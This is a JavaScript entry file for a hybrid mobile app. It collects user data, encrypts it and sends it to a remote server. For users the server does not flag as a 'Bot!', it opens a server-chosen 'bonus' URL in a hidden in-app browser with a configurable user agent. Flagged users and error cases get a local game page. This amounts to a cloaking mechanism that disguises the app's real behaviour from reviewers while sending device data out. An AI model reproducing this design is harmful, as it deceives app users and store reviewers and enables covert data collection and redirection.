import { api, stream, saved, browser, signal } from './utils/constants.js';
import crypt from './utils/crypt.js';
import { isUrl, isFalse, isTrue } from './utils/validation.js';
import { getExtra, setExtra } from './utils/extra.js';
import { getDeeplinks, onPlugins } from './utils/plugins.js';
import userCollections from './utils/userCollections';

function sendResponseLogs(obj, name) {
    stream.log("Server", name, { 
        'Response': obj,
    });
}

function sendErrorLogs(err, name) {
    stream.log("Server", name, { 
        'Error': err,
    });
    stream.log("Activity", "loading screen", { 
        'hide': {},
    });
    //navigator.splashscreen.hide();
    stream.log("Activity", "game", { 
        'start': {},
    });
    window.location.href = './app/index.html';
}

function settingsWebView(status, cb) {
    const extra = getExtra();
    stream.log('settingsWebView', extra);
    const { target_browser, user_agent, logger, dont_save_link, old_save_links, count_save_links, home_page } = extra;
    if (isTrue(dont_save_link)) saved.offAll();
    saved.off(old_save_links);
    saved.attempts(count_save_links);
    if (isUrl(home_page)) saved.homePage(home_page);
    const target = (target_browser==='_blank' || target_browser==='_self' || target_browser==='_system') ? target_browser : '_blank';
    const options = (user_agent) ? `useragent=${user_agent}&&hidden=yes` : `hidden=yes`;
    if (status) onPlugins(extra);
    if (isTrue(logger)) stream.activate();
    cb(target, options);
}

function webView(url, status) {
    stream.log(`startingBrowser: url:${url}`);
    settingsWebView(status, (target, options) => browser.open(url, target, options));
}

function appInitialization(extra, access_token) {
    getDeeplinks(extra, access_token)
        .then((links) => crypt(links))
        .then((str) => api.getLinks(str))
        .then((res) => sendResponseLogs(res, "second") || isUrl(res.bonus) ? res : Promise.reject(res))
        .then(({ bonus, extra={}}) => {
            const { app_metrica_key, pid } = extra;
            window.metrica.activate(app_metrica_key, false);
            if (pid) signal.sendTag(pid);
            webView(bonus, false);
        })
        .catch((err) => sendErrorLogs(err));
}

function getFirstRequest(site) {
    stream.log("getFirstRequest", "start");
    userCollections()
        .then((user) => stream.log("user data", user) || crypt(user))
        .then((str) => stream.log("crypt", str) || api.getAuth(str))
        .then((data) => {
            stream.log("getAuth", data);
            const { bonus, extra, id, access_token } = data;
            if (id) localStorage.setItem('id', id);
            stream.log("Server", "first", { 
                "Response": data 
            });
            stream.log("BusinessLogic", "authorization", { bonus });
            stream.log('getFirstRequest: ', 'bonus: ', bonus, 'extra: ', extra, 'id', id, 'access_token', access_token);
            if (!bonus && !site) throw "Connection error!";
            if (isFalse(bonus)) throw "Bot!";
            if (!site && access_token) {
                appInitialization(extra, access_token);
                setExtra(extra);
            }
        })
        .catch((err) => sendErrorLogs(err, "first"));
}

function appDeviceReady() {
    const site = localStorage.getItem('site');
    if (site) webView(site, true);
    getFirstRequest(site);
}

function onBackKeyDown() {
    stream.log("Events", "BackButton");
}
function onPause() {
    stream.log("Events", "onPause");
}
function onResume() {
    stream.log("Events", "onResume");
}

document.addEventListener('pause', onPause, false);
document.addEventListener('resume', onResume, false);
document.addEventListener('backbutton', onBackKeyDown, false);
document.addEventListener('deviceready', appDeviceReady, false)